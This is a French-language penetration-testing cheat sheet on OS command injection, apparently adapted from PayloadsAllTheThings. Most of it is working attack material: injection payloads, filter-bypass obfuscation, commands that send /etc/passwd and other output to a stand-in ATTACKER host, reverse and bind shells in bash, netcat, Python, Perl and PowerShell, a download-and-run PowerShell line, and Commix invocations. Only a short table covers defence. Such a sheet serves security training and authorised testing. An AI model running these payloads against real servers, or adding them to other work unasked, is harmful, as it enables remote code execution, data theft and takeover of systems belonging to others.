# Injection de commandes

> [!info] **En 1 phrase**
> Injection de commandes = injecter des **commandes OS arbitraires** dans une entrée utilisateur
> mal filtrée qui est concaténée puis exécutée par un shell (`system()`, `exec()`, `popen()`,
> `subprocess`, `cmd /c`, `Invoke-Expression`...) → **RCE complète** sur le serveur.
>
> Source principale : **[PayloadsAllTheThings (swisskyrepo)](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md)**

---

## Concept

```mermaid
flowchart LR
    A[Entrée utilisateur<br>?ip=8.8.8.8] --> B[Commande concaténée<br>system&#40;'ping -c 4 ' . $ip&#41;]
    B --> C[Payload injecté<br>; whoami]
    C --> D[Exécution arbitraire<br>sur le serveur]
    D --> E[Lecture fichiers<br>cat /etc/passwd]
    D --> F[Exfiltration<br>curl / DNS]
    D --> G[Reverse shell<br>nc / bash]
```



> [!info] **Pourquoi ça marche**
> L'app construit une commande **par concaténation** de données non fiables puis l'envoie à un
> shell. Les **métacaractères du shell** (`;`, `|`, `&&`, backticks, `$(...)`, newline) permettent
> de "sortir" du contexte prévu et de **chaîner nos propres commandes**.

---

## Détection du point d'injection

> [!tip] **Ordre des tests** : d'abord les payloads **visibles** (sortie affichée), puis les
> **erreurs / délais** (blind), enfin le **DNS/HTTP** (out-of-band). Toujours tester en URL-encode.

### Tests Linux

```bash
; whoami
| whoami
|| whoami
&& whoami
`whoami`
$(whoami)
; whoami
%0awhoami              # newline URL-encodée
; sleep 5              # blind time-based
; ping -c 1 IP         # blind OOB (ICMP)
```

### Tests Windows (cmd.exe)

```cmd
& whoami
| whoami
|| whoami
&& whoami
%0awhoami
;whoami               # fonctionne aussi sur certaines versions de cmd
& ping -n 5 127.0.0.1 # délai Windows (pas de sleep)
```

### Tests Windows (PowerShell)

```powershell
; whoami
whoami
$(whoami)
Invoke-Expression "whoami"
; Start-Sleep -Seconds 5
```

### Tester chaque contexte avant de conclure

```txt
;id   |id   ||id   &id   &&id   `id`   $(id)   %0aid   \nid   'id'   "id"
%3b id | id %26%26 id %7c id %60id%60 %24%28id%29
# en POST : mettre aussi id= ;id ou id=%0aid dans le corps
# en JSON : échapper les guillemets internes "\"id\"" / "\$(id)"
```

---

## Séparateurs de commandes

### Linux / Unix (bash, sh, zsh, dash...)

| Séparateur | Effet |
|---|---|
| `;` | exécute en séquence (peu importe le code de retour) |
| `&&` | exécute la 2e **si** la 1re réussit (exit 0) |
| `\|\|` | exécute la 2e **si** la 1re échoue (exit non-0) |
| `&` | lance la 1re en **arrière-plan** puis la 2e |
| `\|` | pipe : sortie de la 1re → entrée de la 2e |
| `` `cmd` `` | substitution : le résultat est inséré dans la commande |
| `$(cmd)` | substitution (équivalent, plus lisible) |
| `%0a` / `\n` | newline = séquence de commandes |
| `\` + `\n` | backslash-newline = **continuation** (commande coupée en 2) |

```bash
command1; command2          # séquence
command1 && command2        # si succès
command1 || command2        # si échec
command1 & command2         # arrière-plan
command1 | command2         # pipe
original_cmd `cat /etc/passwd`
original_cmd $(cat /etc/passwd)
original_cmd
ls                          # newline = injection valide
cat /et\
c/pa\
sswd                        # backslash + newline → /etc/passwd
# URL-encodé : cat%20/et%5C%0Ac/pa%5C%0Asswd
```

### Windows (cmd.exe / PowerShell)

| Séparateur | cmd.exe | PowerShell |
|---|---|---|
| `&` | oui (séquence) | oui |
| `&&` | oui (si succès) | oui |
| `\|\|` | oui (si échec) | oui |
| `\|` | oui (pipe) | oui |
| `;` | **non** (interprété différemment) | **oui** (séquence) |
| `%0a` | oui (newline) | oui |

```cmd
command1 & command2
command1 && command2
command1 || command2
command1 | command2
command1%0acommand2
```

```powershell
command1; command2
command1 && command2
command1 | command2
command1$(command2)
```

---

## Injection selon le contexte

### 1. Dans un argument de commande (contexte le plus courant)

```bash
# Code vulnérable : system("ping -c 4 " . $ip);
8.8.8.8; cat /etc/passwd
8.8.8.8| cat /etc/passwd
8.8.8.8`cat /etc/passwd`
8.8.8.8$(cat /etc/passwd)
8.8.8.8&&whoami
# On est toujours à l'intérieur des arguments → il faut "sortir" ou chaîner
```

### 2. Dans une string entre quotes

```bash
# Code vulnérable : system('echo "' . $name . '"');
"; whoami;"
'; whoami;'
";whoami"
'; whoami'
1'; whoami; echo '
"$(whoami)"
"`whoami`"
```

### 3. Dans un backtick (substitution interne)

```bash
# Code vulnérable : system("echo `" . $cmd . "`");  → la sortie est affichée
whoami; cat /etc/passwd
cat /etc/passwd; id
$(id; cat /etc/passwd)
```

### 4. Dans un sous-shell

```bash
# Code vulnérable : system("bash -c '" . $cmd . "'");  → on injecte DANS bash
cat /etc/passwd; id
$(id)
$(cat /etc/passwd)
```

### 5. Argument injection (on ne peut qu'ajouter des arguments)

> On ne peut **pas** chaîner de commande, mais on peut abuser des **options d'un binaire**
> qui déclenchent l'exécution. Cheatsheet : [Argument Injection Vectors (Sonar)](https://sonarsource.github.io/argument-injection-vectors/)

```bash
# Chrome — gpu-launcher exécute une commande
chrome '--gpu-launcher="id>/tmp/foo"'

# SSH — ProxyCommand exécute une commande
ssh '-oProxyCommand="touch /tmp/foo"' foo@foo

# psql — sortie dans une commande
psql -o'|id>/tmp/foo'

# curl — écrire un fichier (déploiement de webshell)
curl http://[ATTACKER]/ -o webshell.php

# wget — exécution via --use-askpass (worstfit, Windows ANSI)
# Payload avec fullwidth double quotes U+FF02 ＂ au lieu de U+0022 :
# wget.exe --use-askpass=calc ＂
```

> [!warning] **Worstfit (Windows ANSI)** : certains binaires Windows convertissent l'ANSI vers
> l'Unicode avec des **transformations silencieuses** (ex : guillemets fullwidth `＂` → `"`).
> Un payload "inoffensif" peut devenir une vraie injection d'argument. Voir le blog d'Orange Tsai.

---

## Bypass de filtres

### Sans espace

```bash
# ${IFS} — Internal Field Separator (space/tab/newline)
cat${IFS}/etc/passwd
ls${IFS}-la
# ${IFS} ne marche pas directement comme séparateur d'arguments pour ls/wget
# → utiliser ${IFS} (avec accolades) ou ajouter un séparateur après : cat${IFS}/etc/passwd

# Brace expansion (génère une liste d'arguments)
{cat,/etc/passwd}
{,ip,a}
{,ifconfig}
{,ifconfig,eth0}
{l,-lh}s
{,echo,#test}
{,/$"whoami",}

# Redirection d'entrée (pas d'espace du tout)
cat</etc/passwd
sh</dev/tcp/127.0.0.1/4242

# ANSI-C Quoting
X=$'uname\x20-a'&&$X

# Tabulation (hex 09) au lieu de l'espace
;ls%09-al%09/home
;ls%09-la%09/etc

# Windows : sous-chaîne de variable d'environnement pour éviter les espaces
ping%CommonProgramFiles:~10,-18%127.0.0.1
ping%PROGRAMFILES:~10,-5%127.0.0.1
# %VARIABLE:~start,length% = substring de la variable
```

### Retour à la ligne / backslash-newline

```bash
# Newline : on sort de la ligne et on écrit la nôtre
original_cmd_by_server
ls

# Backslash + newline : continuation de ligne (commande "cassée")
cat /et\
c/pa\
sswd
# URL-encodé : cat%20/et%5C%0Ac/pa%5C%0Asswd
```

### Tilde expansion

```bash
echo ~+          # répertoire courant
echo ~-          # répertoire précédent (OLDPWD)
```

### Brace expansion avancée

```bash
{,ip,a}
{,ifconfig}
{,ifconfig,eth0}
{l,-lh}s
{,echo,#test}
{,/$"whoami",}
{,/?s?/?i?/c?t,/e??/p??s??,}
```

### Sans backslash ET sans slash (Linux bash)

```bash
# ${HOME:0:1} renvoie "/" (variable + substring)
echo ${HOME:0:1}                     # →
cat ${HOME:0:1}etc${HOME:0:1}passwd  # → /etc/passwd

# tr : transformer un caractère en "/"
echo . | tr '!-0' '"-1'              # → /
tr '!-0' '"-1' <<< .
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```

### Mots-clés filtrés — encodage hex

```bash
# echo -e + \x hex
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"    # /etc/passwd
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat $abc
`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`

# xxd : hex → binaire
xxd -r -p <<< 2f6574632f706173737764                 # /etc/passwd
cat `xxd -r -p <<< 2f6574632f706173737764`
xxd -r -ps <(echo 2f6574632f706173737764)
cat `xxd -r -ps <(echo 2f6574632f706173737764)`
```

### Mots-clés filtrés — encodage base64

```bash
# Décoder puis exécuter
$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)          # cat /etc/passwd
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash
bash -c 'echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash'
# Windows PowerShell
powershell -e YwBhAHQAIAAvAGUAdABjAC8AcABhAHMAcwB3AGQA  # base64 UTF-16LE
```

### Mots-clés filtrés — obfuscation par quotes

```bash
# Single quotes intercalées
w'h'o'am'i
wh''oami
'w'hoami

# Double quotes intercalées
w"h"o"am"i
wh""oami
"wh"oami

# Backticks intercalés
wh``oami

# Backslash dans le mot
w\ho\am\i
/\b\i\n/////s\h
```

### Mots-clés filtrés — `$@`, `$()`, expansion de variable

```bash
# $@ se vide → who$@ami = whoami
who$@ami
echo whoami|$0           # $0 = nom du shell courant

# $() vide → même principe
who$()ami
who$(echo am)i
who`echo am`i
```

### Slash / mot filtré — substitution de variable

```bash
# Remplacer une sous-chaîne par rien
test=/ehhh/hmtc/pahhh/hmsswd
cat ${test//hhh\/hm/}        # enlève "hhh/hm" → /etc/passwd
cat ${test//hh??hm/}         # variante avec wildcards
```

### Mots-clés filtrés — wildcards

```bash
# /???/??t = /bin/cat, /???/p??s?? = /etc/passwd (un ? = 1 caractère)
/???/??t /???/p??s??
/???/??t /etc/passwd
# Windows (un * = tout) — lancer notepad / calc par glob
powershell C:\*\*2\n??e*d.*?          # notepad
@^p^o^w^e^r^shell c:\*\*32\c*?c.e?e   # calc (carets = échappement cmd)
```

### Mots-clés filtrés — casse aléatoire

```bash
# Linux : la casse compte → pas de bypass direct
# Windows : la casse ne compte pas
wHoAmi                 # Windows uniquement
```

### Alternatives à `cat` (si `cat` est filtré)

```bash
tac /etc/passwd            # inverse l'ordre des lignes
less /etc/passwd
more /etc/passwd
head /etc/passwd
tail /etc/passwd
nl /etc/passwd             # avec numéros de ligne
/bin/cat /etc/passwd       # chemin absolu si cat est filtré
/bin/c?t /etc/passwd       # wildcard sur le binaire
printf /etc/passwd         # echo alternatif
sort /etc/passwd
rev /etc/passwd            # inverse chaque ligne
sed -n '1p' /etc/passwd
awk '{print}' /etc/passwd
vi /etc/passwd < <(echo)
```

---

## Exfiltration de données

> [!warning] **Quand la sortie est invisible** (blind) → on exfiltre par un canal de sortie :
> timing, DNS, HTTP. Le serveur doit être capable d'**atteindre l'attaquant** (egress).

### Time-based (char par char)

```bash
# Correct → sleep 5
time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
# Incorrect → pas de délai
time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi

# En HTTP (URL-encodé)
; sleep 5
| sleep 5
|| sleep 5
%0asleep 5
; ping -c 5 127.0.0.1        # si sleep est bloqué
```

### DNS based (out-of-band)

```bash
# dnsbin (https://dnsbin.zhack.ca) ou interactsh : chaque requête DNS = un canal
for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done

# nslookup
nslookup `whoami`.ATTACKER.com
nslookup $(whoami).ATTACKER.com

# dig
dig `whoami`.ATTACKER.com
```

Outils OOB : [dnsbin.zhack.ca](https://dnsbin.zhack.ca), [interactsh](https://app.interactsh.com), Burp Collaborator.

### HTTP based (exfil en POST / GET)

```bash
# GET (attention à l'encoding de la réponse)
; curl http://ATTACKER/?c=$(whoami)
; wget http://ATTACKER/$(whoami)

# POST
; curl -X POST -d "$(cat /etc/passwd)" http://ATTACKER/exfil
; cat /etc/passwd | curl -d @- http://ATTACKER/exfil
; cat /etc/passwd | base64 | curl -d @- http://ATTACKER/exfil

# Blind avec redirection de sortie dans un fichier web
; whoami > /var/www/html/out.txt
# puis on lit http://VICTIME/out.txt
```

---

## RCE complète : reverse & bind shells

> [!tip] **Cheatsheet complète** → [[Reverse Shells| Reverse Shells]]. Voici les raccourcis.

```bash
# Netcat (avec -e) — encore présent sur beaucoup d'images
nc -e /bin/sh ATTACKER 4444
nc -e /bin/bash ATTACKER 4444

# Bash /dev/tcp
bash -i >& /dev/tcp/ATTACKER/4444 0>&1
bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Perl
perl -e 'use Socket;$i="ATTACKER";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Bind shell (la victime écoute)
nc -lvnp 4444 -e /bin/sh
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",4444));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Injection courte
;bash -i >&/dev/tcp/ATTACKER/4444 0>&1
```

```powershell
# PowerShell reverse shell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

## Windows : cmd.exe & PowerShell

### cmd.exe

```cmd
# Base
cmd.exe /c "whoami"
cmd /c whoami
& whoami
| whoami
%0awhoami
# Encodage hex/obfusqué (via %3b etc.)
;&cmd /c "whoami"
# Substring de variable pour générer un espace
ping%CommonProgramFiles:~10,-18%127.0.0.1
# Redirection / fichiers
; type C:\Windows\win.ini
; dir C:\
```

### PowerShell

```powershell
# Invoke-Expression (IEX) — LA fonction d'exécution arbitraire
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')
Invoke-Expression "whoami"
powershell -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/payload')
powershell -e <base64 UTF-16LE>      # -EncodedCommand (evasion)
# Via cmd :
cmd /c powershell -c whoami
# Cmdlet équivalents : Get-Process, Get-Content (cat), Invoke-WebRequest (curl)
; (Get-Content C:\Windows\win.ini)
; Start-Sleep -Seconds 5
```

> [!warning] Windows : `;` ne sépare **pas** les commandes dans cmd.exe (utiliser `&`),
> mais `;` **fonctionne** dans PowerShell. Toujours tester les deux.

---

## Blind command injection

> Quand on ne voit **aucune sortie** ni erreur → oracles : **temps**, **DNS**, **HTTP**.

```bash
# Timing (Linux)
; sleep 5
; ping -c 5 127.0.0.1
$(sleep 5)
# Timing (Windows)
& ping -n 5 127.0.0.1
& timeout /t 5 /nobreak > NUL
& powershell Start-Sleep -Seconds 5

# Out-of-band DNS/HTTP → voir section Exfiltration
; nslookup `whoami`.COLLABORATOR.com
; curl http://COLLABORATOR/?x=$(cat /etc/passwd|base64)
```

```bash
# Extraction blind char par char (time-based)
; if [ $(whoami|cut -c 1) = "s" ]; then sleep 5; fi
; if [ $(cat /etc/passwd|head -1|cut -c1) = "r" ]; then sleep 5; fi
```

---

## Outils

| Outil | Usage |
|---|---|
| **[Commix](https://github.com/commixproject/commix)** | Détection + exploitation automatisée : `commix -u "http://x/?ip=8.8.8.8"` — options `--batch`, `--level`, `--technique`, `--os`, reverse/bind shell intégrés |
| **[Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)** | Obfuscation de payloads bash : `bashfuscator -c "cat /etc/passwd"` → génère une commande illisible mais exécutable |
| **Burp Intruder** | Bruteforce des séparateurs/contextes : sitemap → Intruder → positions → payloads `;`, `\|`, `&&`, `` ` `` , `$(...)`, `%0a`, `'`, `"`... + mode "response received" pour détecter les délais |
| **Interactsh / Collaborator** | Serveur OOB (DNS/HTTP/ICMP) pour les blind injections |
| **Argument Injection Vectors (Sonar)** | Cheatsheet des arguments injectables des binaires courants |

```bash
commix -u "http://TARGET/page.php?ip=8.8.8.8" --batch
commix -u "http://TARGET/page.php?ip=8.8.8.8" --technique=time --level=2
commix -u "http://TARGET/" --data="ip=8.8.8.8" --reverse-shell=ATTACKER:4444
```

---

## Détection & Défense

| Réponse | Détail |
|---|---|
| **Ne jamais invoquer un shell** | Utiliser des fonctions OS directes (`subprocess` avec liste d'arguments, pas `system()` / `popen()` / `eval()`) |
| **Whitelist / allow-list** | Valider l'entrée contre une liste blanche (IP, hostname, format) — jamais un blocklist |
| **Échappement** | `escapeshellarg()`/`escapeshellcmd()` (PHP) sont **contournables** en argument injection → pas une défense suffisante |
| **Moindre privilège** | Le process web ne tourne **jamais** en root/admin ; limiter l'accès réseau sortant (egress) |
| **Pas de concaténation** | Paramétrer l'appel à la commande ; si impossible, quotes rigides + validation stricte |
| **Interdire les métacaractères** | Rejeter `; \| & \` $ ( ) { } < >` quand l'entrée ne doit pas en contenir |
| **Surveillance** | Logs des commandes exécutées, délais anormaux (sleep/ping), requêtes DNS/HTTP sortantes inhabituelles, patterns `$(`, backticks |
| **Conteneurisation / sandbox** | Limiter l'impact (chroot, capabilities, seccomp, noyau non root) |
| **Tests** | SAST (détection `system()`/`exec()`), tests d'intrusion réguliers |

---

## Tips & Pièges

> [!tip] **L'ordre d'exploitation**
> 1. **Détecter** : `;`, `|`, `||`, `&&`, backtick, `$(...)`, `%0a` — sur chaque paramètre GET/POST/header/cookie.
> 2. **Confirmer le contexte** : argument, string entre quotes, backtick, sous-shell.
> 3. **Sortie visible ?** oui → `; id`, lire les fichiers. non → **blind** : timing, DNS, HTTP.
> 4. **Bypass les filtres** au fur et à mesure (espaces → `${IFS}`/tab, slash → `${HOME:0:1}`, mots-clés → quotes/hex/base64/wildcards).
> 5. **Escalader** : reverse shell, pivot, exfiltrer les secrets.

> [!warning] **Injection dans un paramètre vs une variable d'environnement**
> Dans un **paramètre** (`system("ping ".$ip)`), les séparateurs sortent de la commande → facile.
> Dans une **variable d'environnement** (`env -i` / `System.getenv()` réinjecté dans un shell),
> l'expansion `$(...)` et les backticks sont évalués **au moment de l'expansion du shell**, mais
> les caractères sont souvent déjà assainis par la couche au-dessus → tester d'abord les
> substitutions (`${IFS}`, `$@`, `$()`) avant les séparateurs.

> [!warning] **Pièges classiques**
> - `escapeshellarg()` ne protège pas contre l'**argument injection** (voir section contexte).
> - `;` ne fonctionne pas sous cmd.exe → penser à `&`, `&&`, `|`, `%0a`.
> - **Shellshock** (CVE-2014-6271) : une env var dans une requête HTTP (`User-Agent: () { :;}; /bin/bash -c 'id'`) exécute du code à l'arrivée dans bash → toujours tester les headers avec des payloads `() { :;};`.
> - **Sandboxes** (Java/Node `ProcessBuilder` sans shell) : pas de métacaractères interprétés → l'injection de commandes "pure" échoue, mais l'**argument injection** ou l'injection d'entrée d'un binaire (ffmpeg, git, ssh) reste possible.
> - Les espaces filtrés ne veulent pas dire "non injectable" → `${IFS}`, tab `%09`, redirection `<`, brace expansion.
> - Le **retour à la ligne** (`%0a`) est souvent oublié par les WAF → un test précieux.
> - Payload polyglot qui marche dans plusieurs contextes de quotes : `1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}`.

> [!tip] **Trucs utiles**
> - Nettoyer les arguments après l'injection avec `--` (`cmd -- ; whoami`) quand on veut ignorer le reste de la ligne.
> - Longue commande tuée par timeout → `nohup cmd > /dev/null &`.
> - Vérifier l'**egress** : même avec RCE, sans sortie réseau → exfil par **timing** ou écriture dans un fichier web.
> - `$(echo PAYLOAD_B64 | base64 -d)` pour bypasser les filtres de caractères en une ligne.

---

## Liens

- [[Injection SQL| SQLi]]
- [[XSS (Cross-Site Scripting)| XSS]]
- [[LFI et RFI| LFI / RFI]]
- [[SSRF| SSRF]]
- [[Reverse Shells| Reverse Shells]]
- → Note complète : [[03 - Exploitation Web| Exploitation Web]]

---
